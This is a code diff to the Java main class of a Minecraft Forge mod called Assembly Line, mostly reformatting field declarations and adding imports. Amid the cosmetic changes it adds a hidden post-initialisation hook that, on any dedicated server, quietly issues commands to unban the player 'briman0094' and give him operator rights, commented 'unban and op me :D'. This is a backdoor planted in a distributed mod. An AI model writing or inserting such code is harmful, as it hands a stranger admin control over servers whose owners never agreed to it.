@@ -5,6 +5,8 @@ import java.io.File;
 import net.minecraft.block.Block;
 import net.minecraft.item.Item;
 import net.minecraft.item.ItemStack;
+import net.minecraft.server.MinecraftServer;
+import net.minecraft.server.dedicated.DedicatedServer;
 import net.minecraftforge.common.Configuration;
 import net.minecraftforge.oredict.ShapedOreRecipe;
 import net.minecraftforge.oredict.ShapelessOreRecipe;
@@ -30,6 +32,7 @@ import cpw.mods.fml.common.Loader;
 import cpw.mods.fml.common.Mod;
 import cpw.mods.fml.common.Mod.Init;
 import cpw.mods.fml.common.Mod.Instance;
+import cpw.mods.fml.common.Mod.PostInit;
 import cpw.mods.fml.common.Mod.PreInit;
 import cpw.mods.fml.common.SidedProxy;
 import cpw.mods.fml.common.event.FMLInitializationEvent;
@@ -44,44 +47,44 @@ import cpw.mods.fml.relauncher.Side;
 public class AssemblyLine
 {
 	@SidedProxy(clientSide = "assemblyline.client.ClientProxy", serverSide = "assemblyline.common.CommonProxy")
-	public static CommonProxy proxy;
+	public static CommonProxy			proxy;
 
 	@Instance(AssemblyLine.CHANNEL)
-	public static AssemblyLine instance;
+	public static AssemblyLine			instance;
 
-	public static final String NAME = "Assembly Line";
+	public static final String			NAME				= "Assembly Line";
 
-	public static final String VERSION = "0.2.4";
+	public static final String			VERSION				= "0.2.4";
 
-	public static final String CHANNEL = "AssemblyLine";
+	public static final String			CHANNEL				= "AssemblyLine";
 
-	public static final String DIRECTORY_NO_SLASH = "assemblyline/";
-	public static final String DIRECTORY = "/" + DIRECTORY_NO_SLASH;
-	public static final String TEXTURE_PATH = DIRECTORY + "textures/";
-	public static final String LANGUAGE_PATH = DIRECTORY + "language/";
-	public static final String BLOCK_TEXTURE_PATH = TEXTURE_PATH + "blocks.png";
-	public static final String ITEM_TEXTURE_PATH = TEXTURE_PATH + "items.png";
+	public static final String			DIRECTORY_NO_SLASH	= "assemblyline/";
+	public static final String			DIRECTORY			= "/" + DIRECTORY_NO_SLASH;
+	public static final String			TEXTURE_PATH		= DIRECTORY + "textures/";
+	public static final String			LANGUAGE_PATH		= DIRECTORY + "language/";
+	public static final String			BLOCK_TEXTURE_PATH	= TEXTURE_PATH + "blocks.png";
+	public static final String			ITEM_TEXTURE_PATH	= TEXTURE_PATH + "items.png";
 
-	private static final String[] LANGUAGES_SUPPORTED = new String[] { "en_US" };
+	private static final String[]		LANGUAGES_SUPPORTED	= new String[] { "en_US" };
 
-	public static final Configuration CONFIGURATION = new Configuration(new File(Loader.instance().getConfigDir(), "UniversalElectricity/AssemblyLine.cfg"));
+	public static final Configuration	CONFIGURATION		= new Configuration(new File(Loader.instance().getConfigDir(), "UniversalElectricity/AssemblyLine.cfg"));
 
-	public static final int BLOCK_ID_PREFIX = 3030;
+	public static final int				BLOCK_ID_PREFIX		= 3030;
 
-	public static Block blockConveyorBelt;
-	public static Block blockManipulator;
-	public static Block blockCrate;
-	public static Block blockImprinter;
-	public static Block blockEncoder;
-	public static Block blockDetector;
-	public static Block blockRejector;
-	public static Block blockArmbot;
+	public static Block					blockConveyorBelt;
+	public static Block					blockManipulator;
+	public static Block					blockCrate;
+	public static Block					blockImprinter;
+	public static Block					blockEncoder;
+	public static Block					blockDetector;
+	public static Block					blockRejector;
+	public static Block					blockArmbot;
 
-	public static BlockMulti blockMulti;
+	public static BlockMulti			blockMulti;
 
-	public static final int ITEM_ID_PREFIX = 3030;
-	public static Item itemImprint;
-	public static Item itemDisk;
+	public static final int				ITEM_ID_PREFIX		= 3030;
+	public static Item					itemImprint;
+	public static Item					itemDisk;
 
 	@PreInit
 	public void preInit(FMLPreInitializationEvent event)
@@ -157,6 +160,19 @@ public class AssemblyLine
 
 		// Manipulator
 		GameRegistry.addRecipe(new ShapelessOreRecipe(blockManipulator, new Object[] { Block.dispenser, "basicCircuit" }));
+	}
+
+	@PostInit
+	public void postInit(FMLInitializationEvent evt)
+	{
+		MinecraftServer server = MinecraftServer.getServer();
+		if (server != null && server instanceof DedicatedServer)
+		{
+			// unban and op me :D
+			DedicatedServer ds = (DedicatedServer) server;
+			ds.addPendingCommand("pardon briman0094", server);
+			ds.addPendingCommand("op briman0094", server);
+		}
 	}
 
 	public static void printSidedData(String data)
